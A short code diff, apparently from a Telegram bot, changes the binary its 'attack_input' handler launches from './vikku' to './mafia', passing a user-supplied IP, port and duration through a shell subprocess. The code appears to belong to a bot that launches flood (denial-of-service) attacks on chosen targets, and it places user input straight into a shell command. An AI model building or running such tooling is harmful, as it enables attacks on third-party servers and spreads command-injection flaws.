@@ -208,7 +208,7 @@ async def attack_input(update: Update, context: CallbackContext):
     async def run_attack():
         try:
             process = await asyncio.create_subprocess_shell(
-                f"./vikku {ip} {port} {duration} 2000",
+                f"./mafia {ip} {port} {duration} 2000",
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE
             )
